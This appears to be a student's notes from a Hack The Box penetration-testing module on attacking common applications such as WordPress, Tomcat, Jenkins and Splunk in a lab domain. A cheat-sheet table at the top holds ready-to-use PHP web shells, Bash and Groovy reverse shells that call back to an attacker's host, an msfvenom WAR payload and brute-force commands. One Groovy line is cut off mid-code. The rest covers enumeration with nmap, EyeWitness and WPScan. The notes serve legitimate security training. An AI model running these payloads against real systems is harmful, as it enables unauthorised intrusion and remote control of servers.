| `curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id` | cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");` | PHP code that will execute a reverse shell on a Linux-based system |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs `droopescan` against a joomla site located at the specified url |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`) |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command. |
| `curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Uses curl to navigate to php web shell file and run system commands (`=id`) on the target |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | `gobuster` powered directory brute forcing attack refrencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`) |
| `auxiliary/scanner/http/tomcat_mgr_login`                    | Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or userlist ( `-u`) as well as a specified password or password list (`-p`) |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates a jsp-based reverse shell payload in the form of a .war file utilizing `msfvenom` |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap scan useful in enumerating Apache Tomcat and AJP services |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow webshell access and to execute commands on the underlying Windows system |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy-based reverse shell payload/code that can work with admin acess to the `Script Console` of a `Jenkins`site. Will work when the underlying OS is Windows |
| [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)              | A simple Splunk package for obtaining revershells on Windows and Linux systems |
|                                                              |                                                              |
|                                                              |                                                              |


* Application Data

	> This module will study several common applications in-depth while briefly covering some other less common (but still seen often) ones. Just some of the categories of applications we may come across during a given assessment that we may be able to leverage to gain a foothold or gain access to sensitive data include:
	- Category 	Applications
	Web Content Management 					Joomla, Drupal, WordPress, DotNetNuke, etc.
	Application Servers 					Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc.
	Security Information and Event Management (SIEM) 	Splunk, Trustwave, LogRhythm, etc.
	Network Management 					PRTG Network Monitor, ManageEngine Opmanger, etc.
	IT Management 						Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.
	Software Frameworks 					JBoss, Axis2, etc.
	Customer Service Management 				osTicket, Zendesk, etc.
	Search Engines 						Elasticsearch, Apache Solr, etc.
	Software Configuration Management 			Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.
	Software Development Tools 				Jenkins, Atlassian Confluence, phpMyAdmin, etc.
	Enterprise Application Integration 			Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.

(https://enlyft.com/tech/)

* Common Applications
	> I typically run into at least one of the applications below, which we will cover in-depth throughout the module sections. While we cannot cover every possible application that we may encounter, the skills taught in this module will prepare us to approach all applications with a critical eye and assess them for public vulnerabilities and misconfigurations.

	Application 	Description
	WordPress 	WordPress is an open-source Content Management System (CMS) that can be used for multiple purposes. It's often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.
	Drupal 	Drupal is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.
	Joomla 	Joomla is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify.
	Tomcat 	Apache Tomcat is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.
	Jenkins 	Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication.
	Splunk 	Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409), and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642).
	PRTG Network Monitor 	PRTG Network Monitor is an agentless network monitoring system that can be used to monitor metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from discovered devices. PRTG is written in Delphi.
	osTicket 	osTicket is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend.
	GitLab 	GitLab is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both community (free) and enterprises versions of the software.

* Module Targets

	> Throughout the module sections, we will refer to URLs such as http://app.inlanefreight.local. To simulate a large, realistic environment with multiple webservers, we utilize Vhosts to house the web applications. Since these Vhosts all map to a different directory on the same host, we have to make manual entries in our /etc/hosts file on the Pwnbox or local attack VM to interact with the lab. This needs to be done for any examples that show scans or screenshots using a FQDN. Sections such as Splunk that only use the spawned target's IP address will not require a hosts file entry, and you can just interact with the spawned IP address and associated port.

	> To do this quickly, we could run the following:
		m1l0js@htb[/htb]$ IP=10.129.42.195
		m1l0js@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts

	> After this command, our /etc/hosts file would look like the following (on a newly spawned Pwnbox):
		m1l0js@htb[/htb]$ cat /etc/hosts
		10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local

[+] Application Discovery & Enumeration

	> To effectively manage their network, an organization should maintain (and continuously update) an asset inventory that includes all network-connected devices (servers, workstations, network appliances, etc.), installed software, and applications in use across the environment. If an organization is unsure what is present on its network, how will it know what to protect and what potential holes exist? The organization should know if applications are installed locally or hosted by a third party, their current patch level, if they are at or nearing end-of-life, be able to detect any rogue applications in the network (or "shadow IT"), and have enough visibility into each application to ensure that they are adequately secured with strong (non-default) passwords, and ideally, multi-factor authentication is enabled. Certain applications have administrative portals that can be restricted to only being accessible from specific IP addresses or the host itself (localhost).
	> The reality is that many organizations do not know everything on their network, and some organizations have very little visibility, and we can help them with this. The enumeration that we perform can be highly beneficial to our clients to help them enhance or start building an asset inventory. We may very likely identify applications that have been forgotten, demo versions of software that perhaps have had their trial license expired and converted to a version that does not require authentication (in the case of Splunk), applications with default/weak credentials, unauthorized/misconfigured applications, and applications that suffer from public vulnerabilities. We can provide this data to our clients as a combination of the findings in our reports (i.e., an application with default credentials admin:admin, as appendices such as a list of identified services mapped to hosts, or supplemental scan data). We can even take it a step further and educate our clients on some of the tools that we use daily so they can begin to perform periodic and proactive recon of their networks and find gaps before penetration testers, or worse, attackers, find them first.
	> As penetration testers, we need to have strong enumeration skills and be able to get the "lay of the land" on any network starting with very little to no information (black box discovery or just a set of CIDR ranges). Typically, when we connect to a network, we'll start with a ping sweep to identify "live hosts." From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let's say we perform an Nmap port scan to identify common web services such as:

* Nmap - Web Discovery
	m1l0js@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list

	> We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient.
	> Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are EyeWitness(https://github.com/FortyNorthSecurity/EyeWitness) and Aquatone(https://github.com/michenriksen/aquatone). Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface.
	> These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. These tools are available for both Windows and Linux, so we can utilize them on whatever we choose for our attack box in a given environment. Let's walk through some examples of each to create an inventory of applications present in the target INLANEFREIGHT.LOCAL domain.

* Getting Organized

	> Though we will cover notetaking, reporting, and documentation in a separate module, it is worth taking the opportunity to select a notetaking application if we haven't done so and begin setting it up to best record the data we are gathering in this phase. The module Getting Started discusses several notetaking applications. If you have not chosen one at this point, it would be an excellent time to start. Tools like OneNote, Evernote, Notion, Cherrytree, etc., are all good options, and it comes down to personal preference. Regardless of the tool you choose, we should be working on our notetaking methodology at this point and be creating templates that we can use in our tool of choice set up for every assessment type.
	> For this section, I would break down the Enumeration & Discovery section of my notebook into a separate Application Discovery section. Here I would create subsections for the scope, scans (Nmap, Nessus, Masscan, etc.), application screenshotting, and interesting/notable hosts to dig more into later. It is important to time and date stamp every scan that we perform and save all output and the exact scan syntax that was performed and the targeted hosts. This can be useful later on if the client has any questions about the activity they saw during the assessment. Being organized from the start and keeping detailed logs and notes will help us greatly with the final report. I typically set up the skeleton of the report at the beginning of the assessment along with my notebook so I can begin filling in certain sections of the report while waiting for a scan to finish. All of this will save time at the end of the engagement, leave us more time for the fun stuff (testing misconfigurations and exploits!), and ensure that we are as thorough as possible.
	> An example OneNote (also applicable to other tools) structure may look like the following for the discovery phase:

* External Penetration Test - <Client Name>
    > Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
    > Client Points of Contact
    > Credentials
    > Discovery/Enumeration
        - Scans
        - Live hosts
    > Application Discovery
        - Scans
        - Interesting/Notable Hosts
    Exploitation
        <Hostname or IP>
        <Hostname or IP>
    Post-Exploitation
        <Hostname or IP>
        <<Hostname or IP>

	> We will refer back to this structure throughout the module, so it would be a very beneficial exercise to replicate this and record all of our work on this module as if we were working through an actual engagement. This will help us refine our documentation methodology, an essential skill for a successful penetration tester. Having notes to refer back to from each section will be helpful when we get to the two skills assessments at the end of the module and will be extremely helpful as we progress in the Penetration Tester path.

* Initial Enumeration
	> Let's assume our client provided us with the following scope:
	> Nmap - Web Discovery
		m1l0js@htb[/htb]$ cat scope_list 

		app.inlanefreight.local
		dev.inlanefreight.local
		drupal-dev.inlanefreight.local
		drupal-qa.inlanefreight.local
		drupal-acc.inlanefreight.local
		drupal.inlanefreight.local
		blog-dev.inlanefreight.local
		blog.inlanefreight.local
		app-dev.inlanefreight.local
		jenkins-dev.inlanefreight.local
		jenkins.inlanefreight.local
		web01.inlanefreight.local
		gitlab-dev.inlanefreight.local
		gitlab.inlanefreight.local
		support-dev.inlanefreight.local
		support.inlanefreight.local
		inlanefreight.local
		10.129.201.50

	> We can start with an Nmap scan of common web ports. I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.
	> On a non-evasive full scope penetration test, I will usually run a Nessus scan too to give the client the most bang for their buck, but we must be able to perform assessments without relying on scanning tools. Even though most assessments are time-limited (and often not scoped appropriately for the size of the environment), we can provide our clients maximum value by establishing a repeatable and thorough enumeration methodology that can be applied to all environments we cover. We need to be efficient during the information gathering/discovery stage while not taking shortcuts that could leave critical flaws undiscovered. Everyone's methodology and preferred tools will vary a bit, and we should strive to create one that works well for us while still arriving at the same end goal.
	> All scans we perform during a non-evasive engagement are to gather data as inputs to our manual validation and manual testing process. We should not rely solely on scanners as the human element in penetration testing is essential. We often find the most unique and severe vulnerabilities and misconfigurations only through thorough manual testing.

	> Let's dig into the scope list mentioned above with an Nmap scan that will typically discover most web applications in an environment. We will, of course, perform deeper scans later on, but this will give us a good starting point.
	> Note: Not all hosts in the scope list above will be accessible when spawning the target below. There will be separate, similar, exercises at the end of this section in order to reproduce much of what is shown here.
	> Nmap - Web Discovery
		m1l0js@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

	> As we can see, we identified several hosts running web servers on various ports. From the results, we can infer that one of the hosts is Windows and the remainder are Linux (but cannot be 100% certain at this stage). Pay particularly close attention to the hostnames as well. In this lab, we are utilizing Vhosts to simulate the subdomains of a company. Hosts with dev as part of the FQDN are worth noting down as they may be running untested features or have things like debug mode enabled. Sometimes the hostnames won't tell us too much, such as app.inlanefreight.local. We can infer that it is an application server but would need to perform further enumeration to identify which application(s) are running on it.

	> We would also want to add gitlab-dev.inlanefreight.local to our "interesting hosts" list to dig into once we complete the discovery phase. We may be able to access public Git repos that could contain sensitive information such as credentials or clues that may lead us to other subdomains/Vhosts. It is not uncommon to find Gitlab instances that allow us to register a user without requiring admin approval to activate the account. We may find additional repos after logging in. It would also be worth checking previous commits for data such as credentials which we will cover more in detail later in this module when we dig deeper into Gitlab.

	> Enumerating one of the hosts further using an Nmap service scan (-sV) against the default top 1,000 ports can tell us more about what is running on the webserver.
	> Nmap - Web Discovery
		m1l0js@htb[/htb]$ sudo nmap --open -sV 10.129.201.50
			PORT     STATE SERVICE       VERSION
			80/tcp   open  http          Microsoft IIS httpd 10.0
			135/tcp  open  msrpc         Microsoft Windows RPC
			139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
			445/tcp  open  microsoft-ds?
			3389/tcp open  ms-wbt-server Microsoft Terminal Services
			5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
			8000/tcp open  http          Splunkd httpd
			8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
			8089/tcp open  ssl/http      Splunkd httpd (free license; remote login disabled)

	> From the output above, we can see that an IIS web server is running on the default port 80, and it appears that Splunk is running on port 8000/8089, while PRTG Network Monitor is present on port 8080. If we were in a medium to large-sized environment, this type of enumeration would be inefficient. It could result in us missing a web application that may prove critical to the engagement's success.

* Using EyeWitness
	> First up is EyeWitness. As mentioned before, EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend http:// and https:// to the front of each. It will perform DNS resolution for IPs and can be given a specific set of ports to attempt to connect to and screenshot.
	> We can install EyeWitness via apt:
		m1l0js@htb[/htb]$ sudo apt install eyewitness

or clone the repository(https://github.com/FortyNorthSecurity/EyeWitness), navigate to the Python/setup directory and run the setup.sh installer script. EyeWitness can also be run from a Docker container, and a Windows version is available, which can be compiled using Visual Studio.

	> Let's run the default --web option to take screenshots using the Nmap XML output from the discovery scan as input.
		m1l0js@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

* Using Aquatone

	> Aquatone(https://github.com/michenriksen/aquatone), as mentioned before, is similar to EyeWitness and can take screenshots when provided a .txt file of hosts or an Nmap .xml file with the -nmap flag. We can compile Aquatone on our own or download a precompiled binary. After downloading the binary, we just need to extract it, and we are ready to go.
	> m1l0js@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
		m1l0js@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 

	> We can move it to a location in our $PATH such as /usr/local/bin to be able to call the tool from anywhere or just drop the binary in our working (say, scans) directory. It's personal preference but typically most efficient to build our attack VMs with most tools available to use without having to constantly change directories or call them from other directories.
	> m1l0js@htb[/htb]$ echo $PATH
		/home/mrb3n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

	> In this example, we provide the tool the same web_discovery.xml Nmap output specifying the -nmap flag, and we're off to the races.
	> m1l0js@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap

* Interpreting the Results
	> Even with the 26 hosts above, this report will save us time. Now imagine an environment with 500 or 5,000 hosts! After opening the report, we see that the report is organized into categories, with High Value Targets being first and typically the most "juicy" hosts to go after. I have run EyeWitness in very large environments and generated reports with hundreds of pages that take hours to go through. Often, the very large reports will have interesting hosts buried deep within them, so it is worth reviewing the entire thing and poking at/researching any applications we are unfamiliar with. I found the ManageEngine OpManager application mentioned in the introduction section buried deep into a very large report during an external penetration test. This instance was left configured with the default credentials admin:admin and left wide open to the internet. I was able to log in and achieve code execution by running a PowerShell script. The OpManager application was running in the context of a Domain Admin account which led to full compromise of the internal network.
	> In the below report, I would be immediately excited to see Tomcat on any assessment (but especially during an External Penetration Test) and would try default credentials on the /manager and /host-manager endpoints. If we can access either, we can upload a malicious WAR file and achieve remote code execution on the underlying host using JSP code(https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
	> Continuing through the report, it looks like the main http://inlanefreight.local website is next. Custom web applications are always worth testing as they may contain a wide variety of vulnerabilities. Here I would also be interested to see if the website was running a popular CMS such as WordPress, Joomla, or Drupal. The next application, http://support-dev.inlanefreight.local, is interesting because it appears to be running osTicket, which has suffered from various severe vulnerabilities over the years. Support ticketing systems are of particular interest because we may be able to log in and gain access to sensitive information. If social engineering is in scope, we may be able to interact with customer support personnel or even manipulate the system to register a valid email address for the company's domain which we may be able to leverage to gain access to other services.
	> This last piece was demonstrated in the HTB weekly release box Delivery by IppSec. This particular box is worth studying as it shows what is possible by exploring the built-in functionality of certain common applications. We will cover osTicket more in-depth later in this module.

	> During an assessment, I would continue reviewing the report, noting down interesting hosts, including the URL and application name/version for later. It is important at this point to remember that we are still in the information gathering phase, and every little detail could make or break our assessment. We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report. During an External Penetration Test, I would expect to see a mix of custom applications, some CMS, perhaps applications such as Tomcat, Jenkins, and Splunk, remote access portals such as Remote Desktop Services (RDS), SSL VPN endpoints, Outlook Web Access (OWA), O365, perhaps some sort of edge network device login page, etc.

	> Your mileage may vary, and sometimes we will come across applications that absolutely should not be exposed, such as a single page with a file upload button I encountered once with a message that stated, "Please only upload .zip and .tar.gz files". I, of course, did not heed this warning (as this was in-scope during a client-sanctioned penetration test) and proceeded to upload a test .aspx file. To my surprise, there was no sort of client-side or back-end validation, and the file appeared to upload. Doing some quick directory brute-forcing, I was able to locate a /files directory that had directory listing enabled, and my test.aspx file was there. From here, I proceeded to upload a .aspx web shell and gained a foothold into the internal environment. This example shows that we should leave no stone unturned and that there can be an absolute treasure trove of data for us in our application discovery data.
	> During an Internal Penetration Test, we will see much of the same but often also see many printer login pages (which we can sometimes leverage to obtain cleartext LDAP credentials), ESXi and vCenter login portals, iLO and iDRAC login pages, a plethora of network devices, IoT devices, IP phones, internal code repositories, SharePoint and custom intranet portals, security appliances, and much more.

* Moving On

	> Now that we've worked through our application discovery methodology and set up our notetaking structure let's deep dive into some of the most common applications that we will encounter time and time again. Please note that this module cannot possibly cover every single application that we will face. Rather, we aim to cover very prevalent ones and learn about common vulnerabilities, misconfigurations, and abusing their built-in functionality.
	> I can guarantee that you will face at least a few, if not all, of these applications during your career as a penetration tester. The methodology and mindset of exploring these applications are even more important, which we will develop and enhance throughout this module and test out during the skills assessments at the end. Many testers have great technical skills but soft skills such as a sound, and repeatable, methodology along with organization, attention to detail, strong communication, and thorough notetaking/documentation and reporting can set us apart and help to build confidence in our skillsets from both our employers as well as our clients.

[+] WordPress - Discovery & Enumeration

	> WordPress, launched in 2003, is an open-source Content Management System (CMS) that can be used for multiple purposes. It’s often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.
	> At the time of writing, WordPress accounts for around 32.5% of all sites on the internet and is the most popular CMS by market share. Here are some interesting facts about WordPress.

    	- WordPress offers over 50,000 plugins and over 4,100 GPL-licensed themes
    	- 317 separate versions of WordPress have been released since its initial launch
    	- Roughly 661 new WordPress websites are built every day
    	- WordPress blogs are written in over 120 languages
    	- A study showed that roughly 8% of WordPress hacks happen due to weak passwords, while 60% were due to an outdated WordPress version
    	- According to WPScan, out of nearly 4,000 known vulnerabilities, 54% are from plugins, 31.5% are from WordPress core, and 14.5% are from WordPress themes.
    	- Some major brands that use WordPress include The New York Times, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz, and many more

	> As we can see from these statistics, WordPress is extremely prevalent on the internet and presents a vast attack surface. We are guaranteed to come across WordPress during many of our External Penetration Test assessments, and we must understand how it works, how to enumerate it, and the various ways it can be attacked.
	> Let us imagine that during an external penetration test, we come across a company that hosts its main website based on WordPress. Like many other applications, WordPress has individual files that allow us to identify that application. Also, the files, folder structure, file names, and functionality of each PHP script can be used to discover even the installed version of WordPress. In this web application, by default, metadata is added by default in the HTML source code of the web page, which sometimes even already contains the version. Therefore, let us see what possibilities we have to find out more detailed information about WordPress.

* Discovery/Footprinting

	> A quick way to identify a WordPress site is by browsing to the /robots.txt file. A typical robots.txt on a WordPress installation may look like:

		User-agent: *
		Disallow: /wp-admin/
		Allow: /wp-admin/admin-ajax.php
		Disallow: /wp-content/uploads/wpforms/

		Sitemap: https://inlanefreight.local/wp-sitemap.xml

	> Here the presence of the /wp-admin and /wp-content directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the wp-admin directory will redirect us to the wp-login.php page. This is the login portal to the WordPress instance's back-end.
	> WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE.
	> There are five types of users on a standard WordPress installation.
    	- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    	- Editor: An editor can publish and manage posts, including the posts of other users.
    	- Author: They can publish and manage their own posts.
    	- Contributor: These users can write and manage their own posts but cannot publish them.
    	- Subscriber: These are standard users who can browse posts and edit their profiles.

	> Getting access to an administrator is usually sufficient to obtain code execution on the server. Editors and authors might have access to certain vulnerable plugins, which normal users don’t.
	
* Enumeration
	> Another quick way to identify a WordPress site is by looking at the page source. Viewing the page with cURL and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. We can enumerate WordPress using a variety of manual and automated tactics.

		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress
		<meta name="generator" content="WordPress 5.8" /

	> Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts. We should spend some time manually browsing the site and looking through the page source for each page, grepping for the wp-content directory, themes and plugin, and begin building a list of interesting data points.
	> Looking at the page source, we can see that the Business Gravity theme is in use. We can go further and attempt to fingerprint the theme version number and look for any known vulnerabilities that affect it.

		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes
		<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />

	> Next, let's take a look at which plugins we can uncover.
		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

		<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
		<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
		<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
		<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
				<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
		<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>

	> From the output above, we know that the Contact Form 7 and mail-masta plugins are installed. The next step would be enumerating the versions.
	> Browsing to http://blog.inlanefreight.local/wp-content/plugins/mail-masta/ shows us that directory listing is enabled and that a readme.txt file is present. These files are very often helpful in fingerprinting version numbers. From the readme, it appears that version 1.0.0 of the plugin is installed, which suffers from a Local File Inclusion vulnerability that was published in August of 2021.

	> Let's dig around a bit more. Checking the page source of another page, we can see that the wpDiscuz plugin is installed, and it appears to be version 7.0.4
		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

		<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
		<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />

	> A quick search for this plugin version shows this(https://www.exploit-db.com/exploits/49967) unauthenticated remote code execution vulnerability from June of 2021. We'll note this down and move on. It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss.

* Enumerating Users
	> We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at /wp-login.php.
	> A valid username and an invalid password results in the following message:
		"Error: The password you entered for the username admin is incorrect"
	> However, an invalid username returns that the user was not found.
		"Error: The username someone is not registered on this site. If you are unsure of your username, try your email address instead"

	> This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.

* Let's recap. At this stage, we have gathered the following data points:
    - The site appears to be running WordPress core version 5.8
    - The installed theme is Business Gravity
    - The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz
    - The wpDiscuz version appears to be 7.0.4, which suffers from an unauthenticated remote code execution vulnerability
    - The mail-masta version seems to be 1.0.0, which suffers from a Local File Inclusion vulnerability
    - The WordPress site is vulnerable to user enumeration, and the user admin is confirmed to be a valid user

	> Let's take things a step further and validate/add to some of our data points with some automated enumeration scans of the WordPress site. Once we complete this, we should have enough information in hand to begin planning and mounting our attacks.

* WPScan

	> WPScan(https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default on Parrot OS but can also be installed manually with gem.
	 
		m1l0js@htb[/htb]$ sudo gem install wpscan

	> WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from WPVulnDB(https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the --api-token parameter.

	> Typing wpscan -h will bring up the help menu.

		m1l0js@htb[/htb]$ wpscan -h


	> The --enumerate flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let’s invoke a normal enumeration scan against a WordPress website with the --enumerate flag and pass it an API token from WPVulnDB with the --api-token flag.

		m1l0js@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>


	> WPScan uses various passive and active methods to determine versions and vulnerabilities, as shown in the report above. The default number of threads used is 5. However, this value can be changed using the -t flag.

